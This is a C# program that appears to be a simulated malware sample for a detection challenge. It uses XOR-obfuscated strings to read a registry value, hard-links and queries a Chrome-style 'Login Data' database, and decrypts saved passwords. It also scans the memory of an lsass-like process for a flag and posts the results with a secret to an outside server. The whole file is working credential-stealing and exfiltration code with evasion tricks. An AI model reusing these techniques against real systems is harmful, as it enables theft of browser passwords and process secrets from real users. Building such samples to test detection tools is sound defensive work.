using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Data.SQLite;
using System.Security.Cryptography;
using Newtonsoft.Json;

class Program
{
    const string SECRET = "00000000000000000000000000000000";
    const int PROCESS_ALL_ACCESS = 0x1F0FFF;
    const int MEM_COMMIT = 0x1000;
    const int PAGE_READWRITE = 0x04;

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public ulong RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern UIntPtr VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, UIntPtr dwLength);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("Kernel32.dll", CharSet = CharSet.Unicode)]
    static extern bool CreateHardLink(string lpFileName, string lpExistingFileName, IntPtr lpSecurityAttributes);

    public static class Obfuscator
    {
        private static byte key = 0xAA;

        public static string Decode(byte[] data)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key);
            }
            return System.Text.Encoding.ASCII.GetString(result);
        }
    }

    static int FindProcessIdByName(string processName)
    {
        foreach (Process proc in Process.GetProcessesByName(processName))
        {
            return proc.Id;
        }
        return -1;
    }

    static string ScanProcessMemory(string processName, string pattern)
    {
        int pid = FindProcessIdByName(processName);

        if (pid == -1)
        {
            Console.WriteLine($"Process {processName} not found.");
            return null;
        }

        IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

        if (processHandle == IntPtr.Zero)
        {
            Console.WriteLine($"Could not open process: {pid}");
            return null;
        }

        IntPtr address = IntPtr.Zero;
        MEMORY_BASIC_INFORMATION memoryInfo;
        Regex regex = new Regex(pattern);

        try
        {
            while (VirtualQueryEx(processHandle, address, out memoryInfo, (UIntPtr)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != UIntPtr.Zero)
            {
                if (memoryInfo.State == MEM_COMMIT && memoryInfo.Protect == PAGE_READWRITE)
                {
                    byte[] buffer = new byte[memoryInfo.RegionSize];
                    if (ReadProcessMemory(processHandle, address, buffer, (UIntPtr)buffer.Length, out IntPtr bytesRead) && bytesRead.ToInt64() > 0)
                    {
                        string bufferString = System.Text.Encoding.ASCII.GetString(buffer);
                        Match match = regex.Match(bufferString);
                        if (match.Success)
                        {
                            return match.Value;
                        }
                    }
                    else
                    {
                        Console.WriteLine($"Failed to read memory at address {address.ToString("X")}");
                    }
                }
                address = new IntPtr(address.ToInt64() + (long)memoryInfo.RegionSize);
            }
        }
        finally
        {
            CloseHandle(processHandle);
        }

        return null;
    }

    static byte[] HexStringToByteArray(string hex)
    {
        return Enumerable.Range(0, hex.Length / 2)
            .Select(x => Convert.ToByte(hex.Substring(x * 2, 2), 16))
            .ToArray();
    }

    static byte[] DecryptPassword(byte[] encryptedPassword, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;
            aesAlg.Mode = CipherMode.CBC;
            aesAlg.Padding = PaddingMode.PKCS7;

            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

            using (System.IO.MemoryStream msDecrypt = new System.IO.MemoryStream(encryptedPassword))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (System.IO.StreamReader srDecrypt = new System.IO.StreamReader(csDecrypt))
                    {
                        return Encoding.UTF8.GetBytes(srDecrypt.ReadToEnd());
                    }
                }
            }
        }
    }

    static string Challenge1()
    {
        byte[] encodedPath = new byte[] {
            0xF9, 0xE5, 0xEC, 0xFE, 0xFD, 0xEB, 0xF8, 0xEF, 0xF6, // "SOFTWARE\" after XOR
            0xE8, 0xE5, 0xE7, 0xE8, 0xEF  // "BOMBE" after XOR
        };
        string registryPath = Obfuscator.Decode(encodedPath);;

        try
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath))
            {
                if (key == null)
                {
                    Console.WriteLine($"Registry key {registryPath} not found.");
                    return null;
                }

                object value = key.GetValue("answer_1");

                if (value == null)
                {
                    Console.WriteLine($"answer_1 not found in registry key {registryPath}.");
                    return null;
                }

                return value.ToString();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error reading registry: {ex.Message}");
            return null;
        }
    }

    static string Challenge2()
    {
        string decryptedPassword = null;
        byte[] encodedDbPath = new byte[] { 0xe9, 0x90, 0xf6, 0xf6, 0xff, 0xd9, 0xcf, 0xd8, 0xd9, 0xf6, 0xf6, // "C:\\Users\\" after XOR
            0xc8, 0xc5, 0xc7, 0xc8, 0xcf, 0xf6, 0xf6, // "bombe\\" after XOR
            0xeb, 0xda, 0xda, 0xee, 0xcb, 0xde, 0xcb, 0xf6, 0xf6, // "AppData\\" after XOR
            0xe6, 0xc5, 0xc9, 0xcb, 0xc6, 0xf6, 0xf6, // "Local\\" after XOR
            0xc8, 0xc2, 0xd8, 0xc5, 0xc7, 0xcf, 0xf6, 0xf6, // "bhrome\\" after XOR
            0xe6, 0xc5, 0xcd, 0xc3, 0xc4, 0x8a, 0xee, 0xcb, 0xde, 0xcb }; // "Login Data" after XOR
        string dbPath = Obfuscator.Decode(encodedDbPath);
        byte[] key = Encoding.UTF8.GetBytes(SECRET);

        // Challenge: File Access Monitor
        string stealDbPath = "C:\\Users\\Public\\steal_login_data.db";
        CreateHardLink(stealDbPath, dbPath, IntPtr.Zero);

        using (SQLiteConnection conn = new SQLiteConnection($"Data Source={stealDbPath};Version=3;"))
        {
            conn.Open();
            using (SQLiteCommand cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
            {
                using (SQLiteDataReader reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        string originUrl = reader.GetString(0);
                        string username = reader.GetString(1);

                        byte[] encodedUser = new byte[] { 0xC8, 0xC5, 0xC7, 0xC8, 0xCF }; // "bombe" after XOR

                        if (username != Obfuscator.Decode(encodedUser)) continue;

                        byte[] encryptedPassword = HexStringToByteArray(reader.GetString(2));

                        try
                        {
                            // Assuming the format of encryptedPassword is iv | ciphertext
                            byte[] iv = new byte[16]; // AES block size for CBC mode is 16 bytes
                            byte[] ciphertext = new byte[encryptedPassword.Length - iv.Length];

                            Buffer.BlockCopy(encryptedPassword, 0, iv, 0, iv.Length);
                            Buffer.BlockCopy(encryptedPassword, iv.Length, ciphertext, 0, ciphertext.Length);

                            byte[] decryptedPasswordBytes = DecryptPassword(ciphertext, key, iv);
                            decryptedPassword = Encoding.UTF8.GetString(decryptedPasswordBytes);
                        }
                        catch (Exception)
                        {
                            decryptedPassword = "Failed to decrypt";
                        }

                        return decryptedPassword;
                    }
                }
            }
        }

        try { System.IO.File.Delete(stealDbPath); } catch { }

        return decryptedPassword;
    }

    static string Challenge3()
    {
        string processName = "bsass";
        byte[] encodedPattern = new byte[] { 0xE8, 0xE5, 0xE7, 0xE8, 0xEF, 0xF5, 0xE7, 0xEB, 0xE6, 0xF5, 0xEC, 0xE6, 0xEB, 0xED, 0xF5, 0xF6, 0xDD, 0xD1, 0x99, 0x98, 0xD7 }; // "BOMBE_MAL_FLAG_\\w{32}" after XOR
        string pattern = Obfuscator.Decode(encodedPattern);

        return ScanProcessMemory(processName, pattern);
    }

    private static async Task SendAnswerToServer(string jsonPayload)
    {
        using (HttpClient client = new HttpClient())
        {
            StringContent content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

            try
            {
                HttpResponseMessage response = await client.PostAsync("https://submit.bombe.top/submitMalAns", content);
                response.EnsureSuccessStatusCode();
                string responseBody = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"Response: {responseBody}");
            }
            catch (HttpRequestException e)
            {
                Console.WriteLine($"Request error: {e.Message}");
            }
        }
    }

    static async Task Main()
    {
        string answer_1 = Challenge1();
        Console.WriteLine(answer_1);
        string answer_2 = Challenge2();
        Console.WriteLine(answer_2);
        string answer_3 = Challenge3();
        Console.WriteLine(answer_3);

        await SendAnswerToServer(JsonConvert.SerializeObject(
            new
            {
                answer_1 = answer_1,
                answer_2 = answer_2,
                answer_3 = answer_3,
                secret = SECRET
            }
        ));
    }
}
